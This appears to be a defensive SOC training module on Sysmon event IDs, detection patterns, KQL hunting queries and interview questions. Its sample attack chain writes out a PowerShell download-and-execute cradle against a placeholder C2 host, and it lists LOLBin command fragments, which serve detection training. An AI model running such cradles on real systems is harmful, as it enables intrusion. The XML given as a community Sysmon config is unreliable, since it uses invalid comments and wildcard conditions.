# Module 5: Sysmon Telemetry

**Priority: P0 — Best endpoint visibility. Essential for L1 triage and investigation.**

---

## 5.1 What is Sysmon?

**System Monitor (Sysmon)** is a Windows system service and device driver that logs detailed system activity to the Windows Event Log. It persists across reboots and survives user logoff.

| Feature | Windows Security Log | Sysmon |
|---------|---------------------|--------|
| Process command line | Only with GPO (often missing) | **Always** |
| Parent process | PID only | **Full path, PID, command line** |
| Hash (SHA256/MD5/IMPHASH) | No | **Yes** |
| Network connections | No (need NDR) | **Yes (EID 3)** |
| File creation | 4663 (noisy, needs SACL) | **Targeted (EID 11)** |
| Registry | 4657 (noisy) | **Targeted (EID 12/13/14)** |
| DNS queries | No | **Yes (EID 22)** |
| Process memory access | No | **Yes (EID 8, 10)** |
| Image/DLL loads | No | **Yes (EID 7)** |
| Pipe creation | No | **Yes (EID 17/18)** |
| WMI events | No | **Yes (EID 19/20/21)** |

**Log Location**: `Applications and Services Logs → Microsoft → Windows → Sysmon → Operational`

---

## 5.2 Sysmon Event IDs — Complete Reference

| EID | Name | Description | Key Fields |
|-----|------|-------------|------------|
| **1** | Process Create | Process execution | Image, CommandLine, ParentImage, ParentCommandLine, User, Hashes, IntegrityLevel, LogonId |
| **2** | File Creation Time Change | Timestomping | TargetFilename, CreationTime, PreviousCreationTime |
| **3** | Network Connection | TCP/UDP outbound/inbound | Image, SourceIp, SourcePort, DestinationIp, DestinationPort, Protocol, User |
| **4** | Service State Change | Service install/start/stop | Image, ServiceName, ServiceType, StartType, Account |
| **5** | Process Terminate | Process exit | Image, ProcessId, User |
| **6** | Driver Load | Kernel driver load | Image, Hashes, Signed, Signature |
| **7** | Image Load | DLL/EXE load | Image, ProcessId, Hashes, Signed |
| **8** | CreateRemoteThread | Cross-process thread injection | SourceImage, TargetImage, SourceProcessId, TargetProcessId |
| **9** | RawAccessRead | Raw disk access | Image, TargetDevice |
| **10** | ProcessAccess | OpenProcess with specific rights | SourceImage, TargetImage, GrantedAccess (hex) |
| **11** | File Create | File created | TargetFilename, Image, Hashes |
| **12** | Registry Create/Delete | Key create/delete | TargetObject, Image, Details |
| **13** | Registry Value Set | Value modification | TargetObject, Image, Details |
| **14** | Registry Key Rename | Key rename | TargetObject, NewName, Image |
| **15** | File Create Stream Hash | Alternate Data Stream | TargetFilename, Image, Hashes, Contents |
| **16** | Sysmon Config Change | Config modified | — |
| **17** | Pipe Created | Named pipe creation | PipeName, Image |
| **18** | Pipe Connected | Named pipe connection | PipeName, SourceImage, TargetImage |
| **19** | WMI Event Filter | Permanent event subscription | FilterName, Query, EventNamespace |
| **20** | WMI Event Consumer | Consumer registration | ConsumerName, Type, CommandLine |
| **21** | WMI Filter-Consumer Binding | Filter→Consumer link | Filter, Consumer |
| **22** | DNS Query | DNS resolution | QueryName, QueryStatus, QueryResults, Image |
| **23** | File Delete | File deletion | TargetFilename, Image |
| **24** | Clipboard Change | Clipboard access | Image, User |
| **25** | Process Tampering | Process hollowing, herpaderping | Image, TargetImage, Technique |
| **26** | File Delete Detected | Archive via USN | TargetFilename, Image |

---

## 5.3 Critical Event IDs for L1 — Deep Dive

### EID 1: Process Create — The Crown Jewel

**Every process execution. Always has command line. Always has hashes.**

```
Key Fields:
├── UtcTime, ProcessGuid, ProcessId
├── Image                    # Full path to executable
├── CommandLine              # FULL command with arguments (decoded!)
├── CurrentDirectory         # Working directory
├── User                     # DOMAIN\user (or SID)
├── LogonGuid, LogonId       # Correlate with 4624
├── IntegrityLevel           # System, High, Medium, Low
├── Hashes                   # SHA256, MD5, IMPHASH (comma-separated)
├── ParentProcessGuid        # Link to parent EID 1
├── ParentProcessId
├── ParentImage              # Parent executable path
├── ParentCommandLine        # Parent's full command line
└── OriginalFileName         # Internal name (detects renames)
```

**Why ParentProcessGuid > ParentProcessId**: PIDs recycle. GUIDs are unique per boot.

**Suspicious Patterns**:
| Pattern | Example | MITRE |
|---------|---------|-------|
| Office → Script | `WINWORD.EXE` → `POWERSHELL.EXE -enc ...` | T1059.001 |
| Script → Script | `POWERSHELL.EXE` → `POWERSHELL.EXE` (nested) | T1059.001 |
| LOLBin | `RUNDLL32.EXE javascript:...`, `REGSVR32.EXE /s /n /u /i:http...` | T1218 |
| Living-off-land | `CERTUTIL.EXE -decode`, `MSHTA.EXE http://...` | T1218 |
| Temp/AppData execution | `C:\Users\...\AppData\Local\Temp\abc.exe` | T1059 |
| Unsigned binary | `Signed: false`, `Company: ` (empty) | T1036 |
| Masquerading | `Image: svchost.exe`, `OriginalFileName: malware.exe` | T1036.003 |
| High integrity child | `CMD.EXE (Medium)` → `POWERSHELL.EXE (High)` | T1548.002 |

### EID 3: Network Connection

```
Key Fields:
├── Image                    # Process making connection
├── User
├── SourceIp, SourcePort
├── DestinationIp, DestinationPort
├── Protocol                 # TCP / UDP
├── DestinationHostname      # If resolved
└── ProcessGuid              # Link to EID 1
```

**Suspicious Patterns**:
| Pattern | Indicator |
|---------|-----------|
| **Beaconing** | Regular interval (60s, 5min), same destination, small bytes |
| **C2 ports** | 80, 443, 8080, 8443, 53 (DNS), 22, 443 (non-browser) |
| **Unusual process** | `POWERSHELL.EXE`, `RUNDLL32.EXE`, `SVCHOST.EXE` (non-system) making outbound |
| **Data exfil** | Large upload (>10MB), cloud storage IPs, file sharing sites |
| **Internal scanning** | Sequential ports, multiple destinations from single process |
| **Non-standard protocol** | HTTP on 443, TLS on 80, custom ports |

### EID 8: CreateRemoteThread — Code Injection

```
Key Fields:
├── SourceImage              # Injector process
├── TargetImage              # Victim process
├── SourceProcessId
├── TargetProcessId
├── NewThreadId
└── StartAddress             # Entry point (often shellcode)
```

**Legitimate**: Debuggers, AV/EDR, some installers.
**Malicious**: Process hollowing, DLL injection, shellcode execution, Cobalt Strike `inject`, Metasploit `migrate`.

**High-value targets**: `LSASS.EXE` (credential theft), `SVCHOST.EXE` (persistence), `EXPLORER.EXE` (user context), browser processes (session hijack).

### EID 10: Process Access — LSASS Access, Token Manipulation

```
Key Fields:
├── SourceImage
├── TargetImage
├── GrantedAccess (hex)      # Decode to rights
├── SourceProcessId
└── TargetProcessId
```

**Critical Access Rights (Memorize Hex)**:
| Hex | Right | Attack |
|-----|-------|--------|
| `0x1FFFFF` | PROCESS_ALL_ACCESS | Full control |
| `0x001F0FFF` | Standard + VM_READ/WRITE | Memory read/write |
| `0x00001000` | PROCESS_VM_READ | Read memory (LSASS dump) |
| `0x00000020` | PROCESS_VM_WRITE | Write memory (injection) |
| `0x00000008` | PROCESS_VM_OPERATION | Memory ops |
| `0x00000040` | PROCESS_QUERY_LIMITED_INFO | Basic info |
| `0x00000100` | PROCESS_CREATE_THREAD | Remote thread (injection) |
| `0x00000400` | PROCESS_DUP_HANDLE | Handle duplication |

**LSASS Access**: `SourceImage` = suspicious (PowerShell, RUNDLL32, custom) + `TargetImage` = `LSASS.EXE` + `GrantedAccess` includes `0x1000` (VM_READ) → **CREDENTIAL THEFT**.

### EID 11: File Create — Malware Drops, Staging, Persistence

```
Key Fields:
├── TargetFilename           # Full path
├── Image                    # Creator process
├── Hashes                   # SHA256, MD5, IMPHASH
├── CreationUtcTime
└── ProcessGuid
```

**Suspicious Paths**:
- `C:\Users\...\AppData\Local\Temp\*`
- `C:\Users\...\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\*`
- `C:\Windows\Tasks\*`, `C:\Windows\System32\Tasks\*`
- `C:\PerfLogs\*`, `C:\Windows\Temp\*`
- `\\?\C:\...` (NTFS alternate data streams)

### EID 12/13/14: Registry — Persistence, Configuration

```
Key Fields:
├── TargetObject             # Registry path
├── Image                    # Modifier process
├── Details                  # Value name/data (EID 13)
├── NewName                  # EID 14
└── ProcessGuid
```

**Critical Persistence Keys**:
| Key | Technique |
|-----|-----------|
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*` | User logon |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\*` | Once |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*` | Current user |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\*` | Policy |
| `HKLM\SYSTEM\CurrentControlSet\Services\*` | Service persistence |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` | Winlogon |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` | Shell |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\*` | BHO |
| `HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32` | COM hijack |
| `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` | DLL hijack |

### EID 22: DNS Query — C2, DGA, Tunneling

```
Key Fields:
├── QueryName                # Domain queried
├── QueryStatus              # 0=Success, else error code
├── QueryResults             # Resolved IPs (comma-separated)
├── Image                    # Process making query
├── ProcessGuid
└── User
```

**Suspicious Patterns**:
| Pattern | Example |
|---------|---------|
| **DGA** | `x7k9m2p4q1w3e5r7t9y.example.com`, high entropy, NXDOMAIN |
| **DNS Tunneling** | Long subdomains (`data.exfil.attacker.com`), TXT records, high query volume |
| **Fast Flux** | Single domain → many IPs (round-robin), low TTL |
| **C2 Domains** | Newly registered (<30 days), suspicious TLD (.tk, .ml, .ga, .cf, .top, .xyz) |
| **Living-off-land** | `POWERSHELL.EXE`, `CMD.EXE`, `RUNDLL32.EXE` making DNS queries |
| **Internal → External** | Workstation querying external DNS directly (bypass corporate DNS) |

---

## 5.4 Process Trees — Building and Analyzing

### The Process Tree Concept
```
Parent (PID 100) → Child (PID 200) → Grandchild (PID 300)
      │                │                   │
   Image: A       Image: B            Image: C
   Cmd: ...       Cmd: ...            Cmd: ...
   User: X        User: X             User: X
```

**In Sysmon**: Link via `ParentProcessGuid` → `ProcessGuid` (not PID).

### Realistic Malicious Chain

```
EXPLORER.EXE (User context, Medium IL)
  └── OUTLOOK.EXE (Email client)
        └── WINWORD.EXE (Open attachment)
              └── CMD.EXE /c "powershell -enc JABjAGwA..." (Macro execution)
                    └── POWERSHELL.EXE -enc JABjAGwA... (Decoded: DownloadString)
                          └── POWERSHELL.EXE IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')
                                └── RUNDLL32.EXE C:\Temp\payload.dll,EntryPoint (DLL execution)
                                      └── POWERSHELL.EXE (C2 beacon)
                                            └── CMD.EXE /c whoami (Discovery)
                                            └── CMD.EXE /c net view (Discovery)
```

**Why this chain is suspicious**:
1. `OUTLOOK` → `WINWORD` → `CMD` — **Office spawning shell** (phishing)
2. `CMD` → `POWERSHELL -enc` — **Encoded command** (obfuscation)
3. `POWERSHELL` → `POWERSHELL` (nested) — **Staging** (download cradle)
4. `POWERSHELL` → `RUNDLL32` — **LOLBin** (DLL execution)
5. `RUNDLL32` → `POWERSHELL` — **C2 beacon** (PowerShell common for C2)
6. `POWERSHELL` → `CMD` (discovery) — **Post-exploitation**

### Legitimate Chains (Know These to Avoid False Positives)

```
# Windows Update
SERVICES.EXE → TIWORKER.EXE → DISMHOST.EXE → CMD.EXE (DISM)

# Software Install
MSIEXEC.EXE → CMD.EXE /c "..." → POWERSHELL.EXE (custom action)

# Browser Update
CHROME.EXE → CHROME.EXE (updater) → CMD.EXE /c "..."

# Admin Script
EXPLORER.EXE → CMD.EXE (admin) → POWERSHELL.EXE (script.ps1)

# EDR/AV Scan
MRT.EXE → CMD.EXE /c "..." (Microsoft Removal Tool)
```

---

## 5.5 Sysmon Configuration — What L1 Should Know

### SwiftOnSecurity Config (Community Standard)
```xml
<RuleGroup name="Default">
  <ProcessCreate onmatch="include">  # EID 1 - ALL processes
    <Image condition="is">*</Image>
  </ProcessCreate>
  <FileCreate onmatch="include">    # EID 11 - Targeted paths
    <TargetFilename condition="begin with">C:\Users\</TargetFilename>
    <TargetFilename condition="begin with">C:\ProgramData\</TargetFilename>
    <TargetFilename condition="begin with">C:\Windows\Temp\</TargetFilename>
    <TargetFilename condition="begin with">C:\Windows\Tasks\</TargetFilename>
  </FileCreate>
  <NetworkConnect onmatch="include"> # EID 3 - ALL outbound
    <Image condition="is">*</Image>
  </NetworkConnect>
  <ImageLoad onmatch="include">     # EID 7 - Unsigned/DLL
    <Image condition="is">*</Image>
    <Signature condition="is"></Signature>  # Unsigned only
  </ImageLoad>
  <CreateRemoteThread onmatch="include"> # EID 8
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    <TargetImage condition="is">C:\Windows\System32\svchost.exe</TargetImage>
  </CreateRemoteThread>
  <ProcessAccess onmatch="include">  # EID 10 - LSASS, critical
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    <GrantedAccess condition="bitmask">0x1010</GrantedAccess>  # VM_READ | QUERY_LIMITED
  </ProcessAccess>
  <DnsQuery onmatch="include">       # EID 22
    <Image condition="is">*</Image>
  </DnsQuery>
</RuleGroup>
```

### Key Config Decisions
| Setting | Recommendation | Reason |
|---------|----------------|--------|
| **Process Create** | Include all (`*`) | Complete visibility |
| **Network Connect** | Include all | C2 detection |
| **File Create** | Targeted (Temp, Startup, Users) | Volume control |
| **Image Load** | Unsigned only | Reduce noise, catch malware |
| **CreateRemoteThread** | Target LSASS, svchost | Injection detection |
| **ProcessAccess** | LSASS + VM_READ | Credential theft |
| **DNS Query** | All | C2, tunneling, DGA |
| **Registry** | Run keys, Services, Winlogon | Persistence |
| **Pipe** | Include all | Lateral, C2 (Cobalt Strike) |
| **WMI** | Include all | Persistence, lateral |

---

## 5.6 Sysmon Query Patterns (KQL)

### Process Tree Reconstruction
```kql
// Build tree from root for a given ProcessGuid
let root_guid = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";
Sysmon
| where EventID == 1
| where ProcessGuid == root_guid
| project UtcTime, ProcessGuid, ProcessId, Image, CommandLine, User, IntegrityLevel, Hashes, ParentProcessGuid, ParentImage, ParentCommandLine
| join kind=leftouter (
    Sysmon
    | where EventID == 1
    | project ChildGuid=ProcessGuid, ChildImage=Image, ChildCommandLine=CommandLine, ChildUser=User, ParentProcessGuid
) on $left.ProcessGuid == $right.ParentProcessGuid
```

### Suspicious Office Spawn
```kql
Sysmon
| where EventID == 1
| where ParentImage has_any ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE", "MSACCESS.EXE")
| where Image has_any ("POWERSHELL.EXE", "CMD.EXE", "WSCRIPT.EXE", "CSCRIPT.EXE", "RUNDLL32.EXE", "REGSVR32.EXE", "MSHTA.EXE", "CERTUTIL.EXE")
| project UtcTime, Computer, User, ParentImage, Image, CommandLine, Hashes
```

### LSASS Access (Credential Theft)
```kql
Sysmon
| where EventID == 10
| where TargetImage =~ "C:\\Windows\\System32\\lsass.exe"
| where GrantedAccess has_any ("0x1010", "0x1FFFFF", "0x1F0FFF", "0x1000", "0x10")
| project UtcTime, Computer, SourceImage, TargetImage, GrantedAccess, SourceProcessId, TargetProcessId, User
| join kind=leftouter (
    Sysmon
    | where EventID == 1
    | project SourceProcessId=ProcessId, SourceImage=Image, SourceCommandLine=CommandLine, SourceUser=User
) on SourceProcessId
```

### Beaconing Detection (Network)
```kql
Sysmon
| where EventID == 3
| where Protocol == "TCP"
| summarize Count=count(), Intervals=make_list(TimeGenerated), Destinations=make_set(DestinationIp) 
  by Image, Computer, DestinationIp, DestinationPort, bin(TimeGenerated, 1h)
| where Count >= 6  // 6+ connections in 1 hour
| extend AvgInterval = (max(Intervals) - min(Intervals)) / (Count - 1)
| where AvgInterval between (30s .. 300s)  // Regular interval
```

### DGA Detection (DNS)
```kql
Sysmon
| where EventID == 22
| where QueryStatus == 0  // Success
| extend Entropy = calculate_shannon_entropy(QueryName)
| where Entropy > 3.5
| where QueryName matches regex @"^[a-z0-9]{15,}\."
| summarize Count=count(), Domains=make_set(QueryName) by Image, Computer, User, bin(TimeGenerated, 1h)
| where Count > 20
```

---

## 5.7 Sysmon vs EDR vs Windows Events

| Capability | Windows Security | Sysmon | EDR |
|------------|------------------|--------|-----|
| Process create + cmdline | Partial (GPO) | **Full** | **Full + behavior** |
| Parent process | PID only | **Full + GUID** | **Full + tree** |
| Hashes | No | **SHA256/MD5/IMPHASH** | **Multi-hash + reputation** |
| Network | No | **EID 3** | **Full + TLS/JA3** |
| File create | 4663 (SACL) | **EID 11 (targeted)** | **Full + sandbox** |
| Registry | 4657 (SACL) | **EID 12/13/14 (targeted)** | **Full + behavior** |
| DNS | No | **EID 22** | **Full + reputation** |
| Memory injection | No | **EID 8, 10** | **Full + prevention** |
| Tamper protection | No | Limited | **Kernel-level** |
| Response | No | No | **Isolate, kill, rollback** |

**Reality**: In MXDR, you get EDR telemetry (which includes Sysmon-like data). Know Sysmon because:
1. EDR fields map to Sysmon concepts
2. Some orgs use Sysmon + SIEM without EDR
3. Understanding Sysmon makes you EDR-agnostic

---

## 5.8 Interview Questions for This Module

1. **What is Sysmon Event ID 1 and why is it better than Windows 4688?**
   - Always includes full command line, hashes (SHA256/MD5/IMPHASH), parent process GUID + command line, integrity level, OriginalFileName.

2. **How do you link parent and child processes in Sysmon?**
   - `ParentProcessGuid` (child) = `ProcessGuid` (parent). Not PID (recycles).

3. **What does Sysmon EID 8 (CreateRemoteThread) indicate and what are high-value targets?**
   - Cross-process thread injection. Targets: LSASS (credential theft), svchost (persistence), explorer (user context), browsers (session hijack).

4. **What GrantedAccess values in EID 10 indicate LSASS memory reading?**
   - `0x1000` (PROCESS_VM_READ), `0x1010` (VM_READ | QUERY_LIMITED), `0x1FFFFF` (ALL_ACCESS).

5. **How do you detect DNS tunneling using Sysmon EID 22?**
   - High entropy subdomains, long labels, high query volume, TXT record responses, success/NXDOMAIN pattern.

6. **What are the key persistence registry keys monitored by Sysmon EID 12/13?**
   - Run/RunOnce (HKLM/HKCU), Services, Winlogon Userinit/Shell, Browser Helper Objects, KnownDLLs, Session Manager.

7. **Explain the suspicious process chain: WINWORD → CMD → POWERSHELL -enc → POWERSHELL → RUNDLL32 → POWERSHELL**
   - Phishing attachment → macro → shell → encoded PS (obfuscation) → download cradle → LOLBin DLL execution → C2 beacon.

8. **What Sysmon configuration does SwiftOnSecurity recommend for Process Create?**
   - Include all (`<Image condition="is">*</Image>`), no filtering.

9. **How does Sysmon EID 3 (Network) differ from NDR?**
   - Sysmon: Process-centric (which process), local only. NDR: Network-centric (full flow, east-west, encrypted metadata).

10. **What is IMPHASH and why is it useful?**
    - Import table hash — identifies malware families even when binary is recompiled/packed differently.

---

## 5.9 Study Checklist for Module 5

- [ ] Recite all 26 Sysmon Event IDs and purpose
- [ ] Deep-dive 8 critical EIDs: 1, 3, 8, 10, 11, 12/13/14, 22, 25
- [ ] Memorize LSASS access rights hex: 0x1000, 0x1010, 0x1FFFFF
- [ ] Build process tree from Sysmon EID 1 (ParentProcessGuid → ProcessGuid)
- [ ] Analyze 5 malicious process chains vs 5 legitimate chains
- [ ] Write KQL for: Office spawn, LSASS access, beaconing, DGA, file drop
- [ ] Explain SwiftOnSecurity config rationale for each rule group
- [ ] Compare Sysmon vs EDR vs Windows Events capabilities
- [ ] Answer all 10 interview questions without notes

---

*Next: Module 6 — PowerShell Security*